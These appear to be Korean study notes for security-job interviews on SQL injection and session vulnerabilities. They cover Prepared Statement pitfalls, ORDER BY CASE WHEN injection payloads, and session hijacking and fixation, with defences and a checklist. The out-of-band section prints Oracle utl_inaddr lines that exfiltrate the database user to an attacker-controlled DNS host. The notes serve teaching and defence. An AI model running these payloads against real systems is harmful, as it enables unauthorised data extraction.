SQL Injection 대응방안 심화

1. Prepared Statement​

1.1 동작 원리​

Statement 방식 (취약) vs Prepared Statement 방식 (안전) 비교

  • Statement: 입력값을 문자열로 그대로 쿼리문에 붙임
  • Prepared Statement: 쿼리문을 미리 컴파일하여 컬럼과 테이블을 고정, 입력값은 데이터로만 인식

면접 질문: "Prepared Statement 쓰면 100% 안전합니까?" 올바른 대답: 제대로 잘 쓰면 100% 안전. 잘못 사용하면 여전히 취약.

1.2 취약한 케이스 1: 테이블명 동적 처리​

// 취약
query = "select 제목, 내용 from " + boardId + " where 제목 like '%?%'";
query.bind(1, keyword);

// 안전 (화이트리스트)
if (boardId == "1") {
    query = "select 컬럼들 from qna where 제목 like ?";
} else if (boardId == "2") {
    query = "select 컬럼들 from notice where 제목 like ?";
}

1.3 취약한 케이스 2: ORDER BY 절​

ORDER BY 뒤에는 컬럼명/번호가 들어가는데 Prepared Statement로 바인딩 불가

2. ORDER BY 인젝션​

CASE WHEN 구문 활용​

ORDER BY (CASE WHEN 조건 THEN 참일때값 ELSE 거짓일때값 END)

숫자형 예시:

ORDER BY 1,(CASE WHEN length(user) > 0 THEN 2 ELSE 555/0 END)

문자형 예시 (테이블명 변조):

boardId = not'||(CASE WHEN 공격쿼리 THEN '' ELSE 'x' END)||'ice

숫자형 인젝션 판별​

?id=62-1 → 61로 조회되면 숫자형 인젝션 가능 URL에서 +는 공백으로 인식되므로 빼기(-) 사용

날짜형 인젝션​

TO_CHAR, TO_DATE 함수 안에 입력값이 들어가는 경우 괄호와 콤마를 맞춰서 공격

3. OOB (Out-of-Band) 공격​

개념​

블라인드 상황에서 외부 서버로 요청을 날려 데이터를 빠르게 추출

Oracle에서 DNS 쿼리 발생​

SELECT utl_inaddr.get_host_address('공격자서버.oast.fun') FROM dual;
SELECT utl_inaddr.get_host_address(user||'.공격자서버주소') FROM dual;

외부 서버 도구​

  • Burp Collaborator (유료)
  • interactsh (무료 - oast.fun)
  • webhook.site

실무 주의사항​

  • 에러 베이스 문제를 OOB로 풀면 안 됨
  • OOB는 블라인드 상황에서만 사용
  • 실무에서 함부로 사용 금지 (네트워크 정책 위반 가능)

4. 쿠키와 세션​

HTTP의 Stateless 특성​

서버는 요청-응답 후 클라이언트가 누구인지 기억하지 못함

쿠키 동작 원리​

  1. 최초 접속 → Set-Cookie: sessid=AAAA
  2. 브라우저가 로컬에 저장
  3. 이후 요청 시 Cookie: sessid=AAAA 자동 전송
  4. 서버가 세션 공간에서 사용자 정보 확인

세션 = 서버 저장 공간, 세션 ID = 인증 정보​

5. 세션 관련 취약점​

5.1 세션 재사용 (Session Hijacking)​

타인의 세션 ID를 탈취하여 로그인하는 공격 공격 방법: PC방 쿠키 확인, 와이파이 패킷 감청, XSS로 쿠키 탈취 대응: IP 비교, HTTPS, 보안 솔루션

5.2 세션 고정 (Session Fixation)​

로그인 전후 세션 ID가 동일하게 유지되는 취약점 대응: 로그인 성공 시 session.invalidate() → 새 세션 발급

5.3 세션 만료 (Session Timeout)​

세션이 무한히 남아있으면 브루트포싱 공격에 취약 대응: 서버 측 타임아웃 설정 (예: 30분)

6. 면접 대비 포인트​

SQL Injection 관련​

  • Prepared Statement의 동작 원리 (컬럼/테이블 고정)
  • Prepared Statement가 취약한 케이스 (테이블명, ORDER BY)

세션 관련 취약점 3가지​

  1. 세션 재사용 - 타인의 세션 ID 탈취하여 사용
  2. 세션 고정 - 로그인 전후 세션 ID 동일
  3. 세션 만료 - 타임아웃 미설정

트러블슈팅 체크리스트​

  • Prepared Statement가 올바르게 적용되어 있는가?
  • 테이블명, ORDER BY 등 동적 SQL 부분에 화이트리스트 적용했는가?
  • 로그인 성공 시 세션 ID가 재발급되는가?
  • 세션 타임아웃이 설정되어 있는가?
  • HttpOnly, Secure 플래그가 쿠키에 설정되어 있는가?
  • HTTPS가 적용되어 있는가?
